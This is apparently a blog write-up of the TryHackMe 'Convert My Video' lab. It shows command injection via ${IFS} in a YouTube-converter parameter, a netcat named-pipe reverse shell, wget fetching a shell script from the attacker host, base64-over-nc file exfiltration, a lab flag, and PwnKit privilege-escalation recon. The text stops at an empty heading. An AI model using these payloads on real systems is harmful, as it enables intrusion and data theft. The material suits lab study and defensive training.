---
{"dg-publish":true,"permalink":"/try-hack-me-rooms/convert-my-video/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"],"created":"2026-04-28T07:22:40.350+02:00","updated":"2026-05-04T22:41:06.404+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"]}}
---

![](/img/user/Attachments/redteaming2.png)

--------
## Description


---------
## Recon

As always a full nmap scan is required to discover running services and active ports on the system. 

![](/img/user/Attachments/nmap1%202.png)

Once the running ports and services are discovered we move forward to enumerating the identified services and ports. 

![](/img/user/Attachments/nmap2%202.png)



![](/img/user/Attachments/homepage%204.png)

A simple homepage. Given the context in the room this is most likely the place for the attack vector. 

-------
## Enumeration

![](/img/user/Attachments/gobuster%201.png)

Gobuster found several and many other 401-endpoints. Sadly they are not accessible without login credentials. 

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.113.161.179  
-t 40 -o dirs.out -b 403-500
```


![](/img/user/Attachments/admin-creds-popup.png)

Visiting **/admin** shows the web app is using HTTP Auth. No credentials found yet. Maybe default credentials work? Or maybe hydra can come to the rescue. 

```bash

# default creds tried - no luck

admin:admin
admin:password
admin:1234567
administrator:admin
administrator:password
administrator:123456
root:toor
```

----
### Looking at the homepage


So, opening **DevTools** and inspecting the code shown in the **main.js** file reveals how the web app handles converting videos to downloadable MP3-files given a youtube link. 

**Main.js** 
```js
$(function () {
    $("#convert").click(function () {
        $("#message").html("Converting...");
        $.post("/", { yt_url: "https://www.youtube.com/watch?v=" + $("#ytid").val() }, function (data) {
            try {
                data = JSON.parse(data);
                if(data.status == "0"){
                    $("#message").html("<a href='" + data.result_url + "'>Download MP3</a>");
                }
                else{
                    console.log(data);
                    $("#message").html("Oops! something went wrong");
                }
            } catch (error) {
                console.log(data);
                $("#message").html("Oops! something went wrong");
            }
        });
    });

});
```

Looking at the javascript code there is a base url for youtube with a watch parameter. This could open the possiblity for command injection. 

### Using Burp Suite for Command Injection Enumeration

![](/img/user/Attachments/idfound.png)

Intercepting the request on the frontpage and entering a random value to capture it. This is possibly the intended attack path. Initially simply entering various commands didnt work neither did URL-encoding or Base64-encoding it. For some reason a semicolon ; works 

**Rough output from Burp Suite**
![](/img/user/Attachments/etc-passwd.png)

**Formatted Output**
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
dmv:x:1000:1000:dmv:/home/dmv:/bin/bash
```

```bash
cat${IFS}/etc/passwd
```


So the output reveals a **dmv** user.  And it also confirms bash is on the system. Entering multiple words doesn't work ..... Furthermore URL or base64 encoding doesnt work either. Bash luckily has a syntax for this which can solve the issue.

**Breakdown of Internal Field Separator**
The ${IFS} is *Internal Field *Separator* aka a syntax in bash allowing to specify a white space character. Since simply writing a command with more than 1 word doesn't work for this payload approach. 


```bash
yt_url=;which${IFS}python3${IFS}python${IFS}perl${IFS}php${IFS}nc${IFS}netcat${IFS}socat${IFS}bash${IFS}sh${IFS}curl${IFS}wget;
```

Let's check for available tools. 

```bash
/usr/bin/python3
/usr/bin/python
/usr/bin/perl
/usr/bin/php
/bin/nc
/bin/netcat
/bin/bash
/bin/sh
/usr/bin/curl
/usr/bin/wget
```

So there are plenty tools available. Perhaps it is possible to spawn a reverse shell. Also worth noting that the commands are being executed from **/var/www/html** perhaps a second approach would be writing a script to the directory and executing it.

----


## Exploitation

```bash
echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' > shell.sh
```

The classic approach did not work. Perhaps creating a named pipe to get a reverse shell will work. Based off of the payload for testing a connection with a named pipe earlier it seems like the ideal approach.

**Testing Payload for Connection with named pipe**
```bash
;mkfifo${IFS}/dev/shm/f;cat${IFS}/dev/shm/f|/bin/sh${IFS}-i${IFS}2>%261|nc${IFS}192.168.141.140${IFS}4444>/dev/shm/f;
```

Running this payload establishes an unstable shell in nc however the shell dies right after receiving input. 

### Writing a reverse shell to the server

### Payload 
```bash
#!/bin/bash  
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [your ip] 5555 >/tmp/f
```

**Breakdown of the Payload**
1. Remove the file 'f' if it exists to avoid conflicts. 
2. Create the named pipe in the /tmp folder 
3. Display the content of the named pipe
4. Pipe the output of the named pipe to the system shell and redirect stderr to stdout 
5. Pipe the output of that into the listener and save it to the named pipe file ensuring that target machine can receive malicious commands 


**Uploading shell.sh to the server**
```bash
;wget${IFS}http://192.168.141.140:8888/shell.sh;
```

![](/img/user/Attachments/rev-shell-uploaded.png)

So, the shell is uploaded via the python http server and burp confirms its a success. So, the rev shell is uploaded.

**Confirming the payload is inside the script**

![](/img/user/Attachments/confirmed-shell-content.png)


```bash
;cat${IFS}shell.sh;
```

For good sake, the content of the payload is confirmed. 

**Gaining foothold with nc**

![](/img/user/Attachments/foothold.png)

```bash
;sh${IFS}shell.sh;
```

So running above command in burp with nc listening will execute a rev shell. Time to do some post exploit.


----
## Post-exploitation

First upgrading the unstable shell to a stable shell.
```bash
python -c 'import pty;pty.spawn("/bin/bash")'

# setting the environment variable
export TERM=xterm-256color

```


**User flag**
`flag{0d8486a0c0c42503bb60ac77f4046ed7}`

First flag found in `/var/www/html/admin` directory. 


### Searching for the Hidden Folder

as per THM instructions, there is a hidden directory. Let's look for it

```bash
find / -name ".*" -type d 2>/dev/null
```

**Breakdown of the command**
	`find /` searches the entire system
	`-name ".*"` searches hidden files 
	`-type d` searches for type **directory**
	`2>/dev/null` redirects stderror to null

![](/img/user/Attachments/hidden-dirs-search.png)

Unfortunately **.gnupg** is read/write only by root. 

-----

### Looking for the YT-dl script

Thinking about the fact that the room uses a script on the webapp, this script might lead to valuable information. Let's look for it via the shell connection. 

![](/img/user/Attachments/grep-for-yt-dl.png)

```bash
ps aux | grep yt-dl
```
 Knowing there is a parameter on this box namely `yt-dl` doing a grep search for it reveals it is indeed running a script named just that. 


![315](/img/user/Attachments/youtube-dl.png)

So let's identify which folder it's in. 

```bash
which youtube-dl 
```

This appears to be a python file in binary. Too large of a file to just cat the content. Unable to use strings since its not on the system. Unable to run python as a web server since http module is not installed.

```bash
base64 'file_goes_here' | nc <IP> <PORT> > saved_file
```

However base64 encoding the file and piping it to nc works just fine. Only downside is having to still manually cat the content of the file. Sadly examining the file on my machine doesnt reveal much. It does confirm that it is the same script running on the webapp. 

----

### Time to look at SUID-binaries

![](/img/user/Attachments/suidbinaries.png)

```bash
find / -type -perm /4000 2>/dev/null
```

Sure enough the well known Pwnkit vulnerability exist on this target. **/usr/bin/pkexec** binary confirms this finding. Let's get to it. 

Let's identify the kernel and build of the target and acquire the CVE from github. 

![](/img/user/Attachments/os-release.png)

```bash
cat /etc/os-release
```

[CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034) Exploit is available here. 

![](/img/user/Attachments/pkexec.png)

```bash
pkexec --version  
pkexec version 0.105
```

Looking at pkexec it is indeed vulnerable due to SUID is set. 

**[Seclists.org](https://seclists.org/oss-sec/2022/q1/80) confirms this is indeed the holy grail**
```
This vulnerability is an attacker's dream come true:

- pkexec is installed by default on all major Linux distributions (we
  exploited Ubuntu, Debian, Fedora, CentOS, and other distributions are
  probably also exploitable);

- pkexec is vulnerable since its creation, in May 2009 (commit c8c3d83,
  "Add a pkexec(1) command");

- any unprivileged local user can exploit this vulnerability to obtain
  full root privileges;

- although this vulnerability is technically a memory corruption, it is
  exploitable instantly, reliably, in an architecture-independent way;

- and it is exploitable even if the polkit daemon itself is not running.
```

Since target has an older version of **gcc** it is not possible to compile the exploit and transfer it to target afterwards. Luckily there are multiple approaches with pwnkit. 

------
## Attack Pattern Analysis (APA)